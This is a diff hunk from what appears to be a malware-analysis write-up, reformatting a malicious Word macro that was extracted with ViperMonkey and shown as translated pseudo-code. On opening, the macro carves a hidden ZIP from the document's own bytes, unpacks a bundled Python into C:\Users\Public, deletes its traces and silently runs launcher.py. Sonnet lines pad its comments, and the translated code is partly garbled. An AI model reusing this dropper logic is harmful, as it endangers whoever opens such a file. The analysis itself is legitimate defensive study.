@@ -79,88 +79,88 @@ By using **ViperMonkey** I was able to extract the VBA macros
 
 # Extracted VBA macro
 ```VBA
-from vb2py.vbfunctions import \*\
-from vb2py.vbdebug import \*\
-def document_open():\
-    data = String()\
-    User = String()\
-    bla = String()\
-    Coper = Object()\
-    ActiveDocument.ActiveWindow.View.ReadingLayout = False\
-    ActiveDocument.Unprotect(\'securePass\')\
-    show()\
-    ActiveDocument.Protect(wdAllowOnlyReading, True, \'securePass\', False, False)\
-    User = \'C:\\\\Users\\\\Public\'\
-    Docer = ActiveDocument.FullName\
-    #Copy\
-    Shell(\'cmd /c copy \' + Docer + \' \' + User + \'\\\\docer.doc\', vbHide)\
-    deay()(( 4 ))\
-    data = bin2var(User + \'\\\\docer.doc\')\
-    data = Right(data, 7074638)\
-    var2bin(User + \'\\\\smile.zip\', data)\
-    bla = VBA.FileSystem.Dir(User + \'\\\\Python37\', vbDirectory)\
-    if bla != VBA.Constants.vbNullString:\
-        Shell(\'cmd /c rmdir /s /q \' + User + \'\\\\Python37\', vbHide)\
-        deay()(( 2 ))\
-    #Unzip\
-    Unzip(User + \'\\\\smile.zip\', User, \'Python37\')\
-    #Clean\
-    Kill(User + \'\\\\smile.zip\')\
-    Kill(User + \'\\\\docer.doc\')\
-    #Run\
-    Shell(\'\"\' + User + \'\\\\Python37\\\\python.exe\' + \'\" \"\' + User + \'\\\\Python37\\\\launcher.py\' + \'\"\', vbHide)\
-\
-def bin2var(filename):\
-    f = **Integer**()\
-    #Which alters **when** it alteration finds,\
-    #**Or** bends **with** the remover **to** remove.\
-    f = FreeFile()\
-    VBFiles.openFile(f, filename, \'b\') # VB2PY (UnknownFileMode) \'Access\', \'Read\', \'Lock\', \'Write\'\
-    fn_return_value = Space(FileLen(filename))\
-    **Get**(f, VBGetMissingArgument(**Get**, 1), bin2var())\
-    VBFiles.closeFile(f)\
-    #O no! it **is** an ever-fixed mark\
-    #That looks **on** tempests **and** **is** never shaken;\
-    **return** fn_return_value\
-\
-def var2bin(filename, data):\
-    f = **Integer**()\
-    #**If** this be **error** **and** upon **me** prov\'d,\
-    #I never writ, nor no man ever lov\'d.\
-    f = FreeFile()\
-    VBFiles.openFile(f, filename, \'w\') # VB2PY (UnknownFileMode) \'Access\', \'Write\', \'Lock\', \'Write\'\
-    VBFiles.writeText(f, data)\
-    VBFiles.closeFile(f)\
-def Unzip(Fname, DefPath, TarFold):\
-    oApp = Object()\
-    FileNameFolder = **Variant**()\
-    #Root folder **for** the **new** folder.\
-    if Right(DefPath, 1) != \'\\\\\':\
-        DefPath = DefPath + \'\\\\\'\
-    #Create the folder name\
-    strDate = Format(Now, \' dd-mm-yy h-mm-ss\')\
-    FileNameFolder = DefPath + TarFold + \'\\\\\'\
-    #Make the normal folder **in** DefPath\
-    MkDir(FileNameFolder)\
-    #Extract the files into the newly created folder\
-    oApp = CreateObject(\'Shell.Application\')\
-    oApp.**Namespace**(FileNameFolder).CopyHere(oApp.**Namespace**(Fname).items, 4)\
-def hide():\
-    ActiveDocument.Sections\[1\].Range.Font.Hidden = False\
-    **for** Section **in** ActiveDocument.Sections:\
-        if Section.Index > 1:\
-            Section.Range.Font.Hidden = True\
-def show():\
-    ActiveDocument.Sections\[1\].Range.Font.Hidden = True\
-    **for** Section **in** ActiveDocument.Sections:\
-        if Section.Index > 1:\
-            Section.Range.Font.Hidden = False\
-def deay(min):\
-    ptr = **Variant**()\
-    ptr = DateAdd(\'s\', min, Time())\
-    if ptr > Time():\
-        **while** **not** (( Time() > ptr )):\
-            pass\
+from vb2py.vbfunctions import \*
+from vb2py.vbdebug import \*
+def document_open():
+    data = String()
+    User = String()
+    bla = String()
+    Coper = Object()
+    ActiveDocument.ActiveWindow.View.ReadingLayout = False
+    ActiveDocument.Unprotect(\'securePass\')
+    show()
+    ActiveDocument.Protect(wdAllowOnlyReading, True, \'securePass\', False, False)
+    User = \'C:\\\\Users\\\\Public\'
+    Docer = ActiveDocument.FullName
+    #Copy
+    Shell(\'cmd /c copy \' + Docer + \' \' + User + \'\\\\docer.doc\', vbHide)
+    deay()(( 4 ))
+    data = bin2var(User + \'\\\\docer.doc\')
+    data = Right(data, 7074638)
+    var2bin(User + \'\\\\smile.zip\', data)
+    bla = VBA.FileSystem.Dir(User + \'\\\\Python37\', vbDirectory)
+    if bla != VBA.Constants.vbNullString:
+        Shell(\'cmd /c rmdir /s /q \' + User + \'\\\\Python37\', vbHide)
+        deay()(( 2 ))
+    #Unzip
+    Unzip(User + \'\\\\smile.zip\', User, \'Python37\')
+    #Clean
+    Kill(User + \'\\\\smile.zip\')
+    Kill(User + \'\\\\docer.doc\')
+    #Run
+    Shell(\'\"\' + User + \'\\\\Python37\\\\python.exe\' + \'\" \"\' + User + \'\\\\Python37\\\\launcher.py\' + \'\"\', vbHide)
+
+def bin2var(filename):
+    f = **Integer**()
+    #Which alters **when** it alteration finds,
+    #**Or** bends **with** the remover **to** remove.
+    f = FreeFile()
+    VBFiles.openFile(f, filename, \'b\') # VB2PY (UnknownFileMode) \'Access\', \'Read\', \'Lock\', \'Write\'
+    fn_return_value = Space(FileLen(filename))
+    **Get**(f, VBGetMissingArgument(**Get**, 1), bin2var())
+    VBFiles.closeFile(f)
+    #O no! it **is** an ever-fixed mark
+    #That looks **on** tempests **and** **is** never shaken;
+    **return** fn_return_value
+
+def var2bin(filename, data):
+    f = **Integer**()
+    #**If** this be **error** **and** upon **me** prov\'d,
+    #I never writ, nor no man ever lov\'d.
+    f = FreeFile()
+    VBFiles.openFile(f, filename, \'w\') # VB2PY (UnknownFileMode) \'Access\', \'Write\', \'Lock\', \'Write\'
+    VBFiles.writeText(f, data)
+    VBFiles.closeFile(f)
+def Unzip(Fname, DefPath, TarFold):
+    oApp = Object()
+    FileNameFolder = **Variant**()
+    #Root folder **for** the **new** folder.
+    if Right(DefPath, 1) != \'\\\\\':
+        DefPath = DefPath + \'\\\\\'
+    #Create the folder name
+    strDate = Format(Now, \' dd-mm-yy h-mm-ss\')
+    FileNameFolder = DefPath + TarFold + \'\\\\\'
+    #Make the normal folder **in** DefPath
+    MkDir(FileNameFolder)
+    #Extract the files into the newly created folder
+    oApp = CreateObject(\'Shell.Application\')
+    oApp.**Namespace**(FileNameFolder).CopyHere(oApp.**Namespace**(Fname).items, 4)
+def hide():
+    ActiveDocument.Sections\[1\].Range.Font.Hidden = False
+    **for** Section **in** ActiveDocument.Sections:
+        if Section.Index > 1:
+            Section.Range.Font.Hidden = True
+def show():
+    ActiveDocument.Sections\[1\].Range.Font.Hidden = True
+    **for** Section **in** ActiveDocument.Sections:
+        if Section.Index > 1:
+            Section.Range.Font.Hidden = False
+def deay(min):
+    ptr = **Variant**()
+    ptr = DateAdd(\'s\', min, Time())
+    if ptr > Time():
+        **while** **not** (( Time() > ptr )):
+            pass
     **return** fn_return_value
 ```
 # VBA Macro Analysis
